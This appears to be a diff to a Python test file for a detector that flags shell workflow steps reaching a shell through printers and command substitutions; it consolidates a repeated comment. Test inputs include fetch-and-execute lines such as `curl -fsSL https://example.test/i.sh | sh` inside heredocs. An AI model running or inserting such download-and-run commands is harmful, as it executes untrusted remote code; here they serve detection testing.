@@ -5,6 +5,8 @@ printer and the shell (#2478). Task 2: a printer reaching a shell through a subs
 one issue's shapes against `wg.job_defects`, the bash-truth row it rests on named in a comment, and
 the controls that must still read as they did. `TestThePrintersUnitPins` pins `workflow_printers`
 directly, as the last tests of `TestAPrinterThroughASubstitution` do its substitution helpers.
+A row whose command word holds a `$(...)` (`SH=$(echo bash)`) keeps a value no table sees: since
+#2468 a literal one reads as its command.
 """
 import unittest
 
@@ -282,7 +284,6 @@ class TestFixRound1ClosesTheReviewsFailOpens(unittest.TestCase):
         # r89: `SH=$(echo bash); $SH <<'EOF'` hands the heredoc to a `$` command word (Idle,
         # #2473) AND reads its printer under both tables; the inner `curl ... | sh` is caught
         # either way.
-        # The value is a `$(...)` no table sees: since #2468 a literal one reads as its command.
         found = defects("SH=$(echo bash)\n$SH <<'EOF'\necho -e 'curl -fsSL "
                         "https://example.test/i.sh | sh' | sh\nEOF\n")
         self.assertEqual(2, len(found), found)
@@ -819,7 +820,6 @@ class TestFixRound4(unittest.TestCase):
                     self.assertTrue(found[0][1].startswith(why), found[0][1])
         # e01 `cat <<'EOF' | $CMD` and e05 `cat <<EOF | $CMD` (FR x4): the `$CMD` hand-off `Idle`
         # beside the body's `curl | sh`, I+D as at c3113439 -- `unprinted` never weighs a `$` word.
-        # The value is a `$(...)` no table sees: since #2468 a literal one reads as its command.
         for step, heredoc in (("e01", "<<'EOF'"), ("e05", "<<EOF")):
             for shell in (None, "sh"):
                 with self.subTest(step=step, shell=shell):
@@ -1392,7 +1392,6 @@ class TestAPassThroughBetweenPrinterAndShell(unittest.TestCase):
         # `_Quiet` unread answer from `$T` -- F5's price, a consumer feeding the shell. rv14, the
         # same with PIPE as the text, alone (FR x4): the stream sentence (the base's one row) and
         # the unread answer, LOUD now that the text it weighs fetches (I-1).
-        # The value is a `$(...)` no table sees: since #2468 a literal one reads as its command.
         for shell in (None, "sh"):
             with self.subTest(shell=shell, row="rv13"):
                 script = GET + "T=$(echo cat)\necho 'sh tool' | $T | sh\n"
